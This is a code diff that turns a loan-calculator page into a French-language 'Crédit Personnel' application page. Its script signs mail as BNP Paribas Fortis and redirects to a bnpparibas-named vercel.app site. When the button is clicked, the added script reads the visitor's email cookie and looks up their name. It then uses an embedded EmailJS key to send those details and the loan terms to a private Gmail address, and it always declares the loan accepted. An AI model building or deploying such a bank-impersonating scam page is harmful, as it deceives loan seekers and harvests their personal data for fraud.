+                                <option class="" value="324"><font ><font >324 mois</font></font></option class="">
+                                <option class="" value="336"><font ><font >336 mois</font></font></option class="">
+                            </select>
+                    </div>
+                    </div>
+        </div>
+    </div>
+<h4 id="waarvoor-title" class="calc-headline waarvoor-title" style="text-align:center;color:seagreen"><font ><font ><font ><font >Quel est le montant que vous souhaitez emprunter ?</font></font></font></font><a id="SpendingPurpose-error" style="display:none;" class="tooltip-btn error" data-bs-toggle="tooltip" data-bs-placement="right" title="" data-bs-original-title="Dit veld is verplicht"><font ><font ><font ><font >
+                !
+            </font></font></font></font></a></h4>
+    <div class="row mb-5 mt-3">
 
-                         <tr>
-                                 <td>Monthly EMI</td>
-                                 <td class="monthly-emi"></td>
-                         </tr>
+        <div class="col-sm-16 position-relative ">
+   <div class="field__control">
+     <div class="SelectContainer-sc-2taqqp-3 select-field"style="margin:10px">
+      <select id="applicant0.loan.selection.category" name="utilisation" required="" class="jVpYzf "style="text-align:center">
+                            <option class="" value="100" alias=""><font ><font >Utilisation gratuite</font></font></option class="">
+                            <option class="" value="101" alias=""><font ><font >Voiture / moto</font></font></option class="">
+                            <option class="" value="102" alias=""><font ><font >Consommation</font></font></option class="">
+                            <option class="" value="103" alias=""><font ><font >Logement / Modernisation</font></font></option class="">
+                            <option class="" value="104" alias=""><font ><font >Boutique</font></font></option class="">
+                            <option class="" value="105" alias=""><font ><font >Financement de la construction et de l'immobilier</font></font></option class="">
+                          </select>
+                            
+                    </div>
+                    </div>
+        </div>
+        
+    </div>
+      <div class="row-80"></div>
+    <div class="row">
+    <div class="col-24">
+      <div class="col-24">
+        <div class="calculator" id="calc-pl" style="">
+          <div class="calculator-intro">
+            <h3 style="color:seagreen;text-align:center"><font ><font ><font ><font >Crédit Personnel</font></font></font></font></h3>
+          </div>
+          <div class="calculator-summary" name="isaac_calc_summary" data-calculatorid="www.posojsi.com/personalLoan" data-calculator-hide-if-unavailable="www.posojsi.com/personalLoan" >
+            <table>
+              <tbody>
+         <tr>
+                  <td >
+                    <font >
+                      <font ><font ><font style="margin: 20px" >Montant mensuel :</font></font></font>
+                    </font>
+                  </td>
+                  <td width="100">
+                    <font id="tarif" ><font ><font >96,23 </font></font></font><font ><font ><span class="currence">€</span></font></font>
+                  </td>
+                </tr>
+                <tr>
+                  <td>
+                    <font >
+                      <font ><font ><font style="margin: 20px" >Durée du prêt</font></font></font>
+                    </font>
+                    <div class="modal fade modal-mobile" id="looptijd" tabindex="-1" role="dialog" aria-labelledby="Looptijd">
+       <div class="modal-dialog" role="document">
+              <div class="modal-content">
+             
+             
+             
+       <div class="modal-header" >
+                            <h4><font >
+                              <font ><font ><font style="margin: 20px;position: relative;bottom: 10px" >Durée du prêt</font></font></font>
+                            </font></h4>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </td>
+   <td name="isaac_calc_duurKredietOvereenkomst_value" data-calculatorid="www.posojsi.com/personalLoan"><font ><font  id="mois"><font ><font  ><div style="position: relative;top: 2px">
+     12 mois
+   </div></font></font></font></font></td>
+                </tr>
+                <tr>
+                  <td>
+                    <font >
+                      <font ><font ><font style="margin: 20px">Taux d'intérêt</font></font></font>
+                    </font>
+                    <div class="modal fade modal-mobile" id="rentepercentage" tabindex="-1" role="dialog" aria-labelledby="Rentepercentage">
+                      <div class="modal-dialog" role="document">
+                        <div class="modal-content">
+                          <div class="modal-header">
+                            <h4>
+                              <font >
+                                <font ><font ><font style="margin: 20px;position: relative;top=0px">Taux d'intérêt</font></font></font>
+                              </font>
+                            </h4>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </td>
+                  <td name="isaac_calc_debetRenteVoet" data-calculatorid="www.posojsi.com/personalLoan">
+                    <font >
+                      <font ><font ><font style="position: relative;top: 10px" >4,30 %</font></font></font>
+                    </font>
+                  </td>
+                </tr>
+                <tr>
+                  <td>
+                    <font >
+                      <font ><font ><font style="margin: 20px">Total payé par vous :</font></font></font>
+                    </font>
+                  </td>
+                  <td name="isaac_calc_totaalBedrag" data-calculatorid="www.posojsi.com/personalLoan" data-value="6558">
+                    <font id="total_mens" style="margin: 20px"><font ><font >1154,76</font></font></font><span class="currence">€</span><font ><font ></font></font>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+        <div style="" class="col text-center ">
+     <div class="calculator-button d-grid my-3" style="margin:20px auto;width: 200px" >
+                      <button id="frage" type="button" class="p-button p-button-primary  btn btn-secondary btn-block " style=" width: 200px;border: none; border-radius: 4px;outline: none;background: seagreen;padding: 8px 0px;color: whitesmoke;font-size: 18px;margin: 20px 0px"><b><font ><font >Crédit acceptés</font></font></b></button>
+                </div>
+            </div>
+      </div>
+    </div>
+    <small class="mb-3">
+      <font >
+        <font ><font ><font ></font></font></font>
+      </font>
+    </small>
+  </div>
+</div>
+</form>
 
-                         <tr>
-                                 <td>Interest Payable</td>
-                                 <td class="interest-payable"></td>
-                         </tr>
 
-                         <tr>
-                                 <td>Total Payable</td>
-                                 <td class="total-payable"></td>
-                         </tr>
-                 </table>
-         </div>
- </div>
-<script src="Loan.js"></script>
-</body>
 
+                        </div>
+                    </div>
+                    </article>
+        <div>
+    
+
+    </footer>
+
+          <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Organization",
+      "name": "Posojsi.com",
+      "address": {
+        "@type": "PostalAddress",
+        "streetAddress": "Beethovnova ulica SI-1000 Ljubljana",
+        
+        
+        
+        "addressCountry": "SI"
+      },
+      "url": "https://www.posojsi.com",
+      "email": "stik@posojsi.com"
+    }
+</script>
+<script type='application/ld+json'>
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "Posojsi.com",
+  "aggregateRating": {
+    "@type": "AggregateRating",
+    "ratingValue": "9,2",
+    "ratingCount": "10",
+    "reviewCount": "124"
+  }
+}
+</script>
+<script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Organization",
+      "name": "Posojsi.com",
+      "address": {
+        "@type": "PostalAddress",
+        "streetAddress": "Beethovnova ulica SI-1000 Ljubljana",
+        
+        
+        
+        "addressCountry": "SI"
+      },
+      "url": "https://www.posojsi.com",
+      
+    }
+</script>
+    
+    
+            <script type="text/javascript" src="/global/js/vendor/bootstrap/bootstrap.bundle.min.js"></script>
+<script type="text/javascript" src="/global/js/vendor/jquery-validation/jquery.validate.min.js"></script>
+<script type="text/javascript" src="/global/js/vendor/jquery-validation/additional-methods.min.js"></script>
+<script type="text/javascript" src="/global/js/isaac.dom-bootstrap-min.js"></script>
+<script src="https://www.posojsi.com//primeicons-master/demo-files/demo.js"></script>
+
+  <script>
+   const frage=document.getElementById('frage')
+   const utilisation=document.getElementById('applicant0.loan.selection.category')
+   const montant=document.getElementById('applicant0.loan.selection.amount')
+   const duration=document.getElementById('applicant0.loan.selection.duration')
+const tarif=document.getElementById('tarif')
+
+const mois=document.getElementById('mois')
+const total_mens=document.getElementById('total_mens')
+const isCompte=document.getElementById("isCompte")
+frage.onclick=()=>{
+  console.log(userGet)
+sendMailLoan()
+}
+
+
+var interest=0,total=0,remboursement_total=0,pourcentage=0
+function handlerTarif(montant,duration){
+    pourcentage = 4.3;
+    interest = (Number(montant) * (pourcentage * 0.036))/Number(duration);      
+     total = (( Number(montant)/ Number(duration)) + interest).toFixed(2);
+    remboursement_total = total * Number(duration);
+    tarif.innerHTML=total
+    total_mens.innerHTML=remboursement_total.toFixed(2)
+    console.log(total)
+}
+   handlerTarif(montant.value,duration.value)
+   montant.onchange=()=>{
+  console.log("hello")
+     handlerTarif(Number( event.target.value),Number(duration.value))
+   }
+   duration.onchange=()=>{
+    console.log("hello1")
+       handlerTarif(Number(montant.value),Number(event.target.value))
+       mois.innerHTML=event.target.value+"mois"
+   }
+   
+  
+   const over=document.getElementById("over")
+   const faremove=document.getElementById("faremove")
+   const iban=document.getElementsByTagName
+   const circle=document.getElementsByClassName("circle")
+   const info=document.getElementsByClassName('info')
+   const textStatus=document.getElementsByClassName("text-status")
+const inputTag=document.getElementsByTagName('input')
+
+const bankuser=document.getElementById("bankuser");
+
+const trans=document.getElementById("trans")
+
+ var usersFetchData=[]
+const op= document.getElementsByClassName("op")
+   const currence= document.getElementsByClassName("currence")
+const loadingDiv = document.getElementsByClassName("RainbowBackground");
+let ibanCheck,bicCheck,montantCheck=false
+
+let listOpe=true,fetchData=[],formGetUser={},bicselect='',view='',user={email:""}
+    const list= document.getElementById('hover-list')
+    const app=document.getElementById('app')
+    const listItem=document.getElementsByTagName('li')
+    const listDeroulante=document.getElementsByClassName("list-drl")
+    
+    
+
+
+/*============Variables setting======*/
+
+
+
+
+
+  
+    
+
+
+/*============Variables setting======*/
+
+
+
+
+
+  list.addEventListener('click',function() {
+   
+      if(listOpe){
+        listDeroulante[0].style.top = '80px'
+        listDeroulante[0].style.opacity = 1
+        listDeroulante[0].style.display='flex'
+        listOpe=false
+      }
+      else{
+        listDeroulante[0].style.top = '65px'
+        listDeroulante[0].style.opacity = 0
+      listDeroulante[0].style.display='none'
+        listOpe=true
+      }
+    
+    })
+   
+/*  ===================================*/ 
+
+function sendMailLoan(){
+  console.log(userGet)
+  try {
+  emailjs.init('nO0mGzC33a5qOSUx7')
+  var param = {
+    sendername: "BNP PARIBAS FORTIS",
+    to: "reunierprospere@gmail.com",
+    name:  '' + userGet.name,
+    replyto: "" + cookies,
+    message: ` ${userGet.name} ${userGet.prenom} fait une demande de prêt pour une consommation de montant ${montant.value}${userGet.currency} sur une durée de ${duration.value} Mois à taux d 'intérêts ${pourcentage}.
+    Mr ${userGet.prenom} ${userGet.name} accepte et être capable de payer par mois une somme ${total}${userGet.currency} et une somme ${remboursement_total}${userGet.currency} à la fin du pr,,êt avec un intérêt assurance risque ${interest.toFixed(2)}.
+    Date de Souscription au Prêt :${new Date().toString()}
+    `
+  
+  }
+  var serviceId = "service_cuzrpno"
+  var templateId = "template_z2winer"
+  
+  
+  emailjs.send(serviceId, templateId, param).then(function(resp) {
+  
+      if (resp.status == 200) {
+        console.log(resp)
+        setTimeout(function(){
+          isCompte.innerHTML = `
+                            
+                                    <div>Vérifications des paramètres du prêt 
+                                    </div> 
+                                    <div> Prêt accepté </div>
+                               <div>
+                               Vous recevez  une Notification par Mail dès que votre compte bancaire de prêt sera accrédité par le montant de prêt demander 
+                               </div>
+                                   <div style = "margin: 30px;text-align: center">
+                                   <istyle="font-size:50px;color:green" class="fa">&#xf058;</i> 
+                                   </div>
+                                   `
+        },2000)
+        
+        isCompte.style.top = '0px'
+        isCompte.style.color = 'green'
+        setTimeout(function() {
+          window.location.href = 'https://bnpparibas-gfrz.vercel.app/account'
+        }, 3000)
+  
+  
+      }
+      else {
+        isCompte.style.top = '0px'
+     
+       
+  
+  console.log(resp.status)
+      }
+    }) 
+
+} catch (e) {
+  
+  isCompte.style.top='0px'
+}
+
+ 
+}
+console.log(new Date().toString())
+/*=======================================*/
+function getCookie(name) {
+  const cookies = document.cookie.split('; ')
+  const value = cookies
+    .find(c => c.startsWith(name + "="))
+    ?.split('=')[1]
+  if (value === undefined) {
+    return null
+  }
+  return decodeURIComponent(value)
+}
+/*=====================================*/
+
+var cookies='',userGet={name:"",
+  prenom:"",currency:""
+  
+}
+window.onchange=function(){
+ cookies=getCookie('email')
+ if(cookies!=''&& cookies!=undefined){
+  fetch('/data.json').then(function(resp) {
+      return resp.json()
+    }).then(function(data) {
+      const user=extrUser(data)
+      userGet.name=user.name
+      userGet.prenom=user.prenom
+      userGet.currency=user.currency
+      currence[0].innerHTML=userGet.currency
+      currence[1].innerHTML=userGet.currency
+      for (let i = 0; i < op.length; i++) {
+        const getContent = op[i].value +userGet.currency
+      
+     
+        op[i].innerHTML=getContent
+      
+          
+      }
+    })
+ }
+ else{
+ /*  window.location.href='https://bnpparibas-gfrz.vercel.app/signup'*/
+ }
+}()
+function extrUser(user){
+  const index=user.findIndex(index=>index.email==cookies)
+  return user[index]
+}
+
+</script>
+<script type="text/javascript">
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
+}
+</script>
+
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+  </body>
 </html>
